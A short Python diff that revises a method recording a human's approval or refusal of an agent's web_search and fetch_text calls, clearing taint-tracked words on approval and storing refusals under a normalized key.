+    def _answered(self, call: tuple[str, str], shown: tuple[str, ...], allowed: bool) -> None:
+        """Allowed: that one call may go, once, and the words its card showed whole (``shown``: _shown_whole) no longer
+        count. Not: it never goes, in any form (_declined_key)."""
         with self._lock:
             self._waiting.discard(call)
             if allowed:
                 self._allowed.add(call)
                 written = {"web_search": call[1], "fetch_text": call[1].partition(FETCH_JOIN)[2]}.get(call[0], "")
-                self.taint.clear(hits, written)
+                self.taint.clear(shown, written)
             else:
-                self._refused.add(call)
+                self._refused.add(_declined_key(call))
 
 
 __all__ = ["COMMON_WORDS", "ReadWords", "SHORT_WORDS", "TaintSet", "WEB_ALLOW", "WEB_CHOICES", "WEB_DONT",
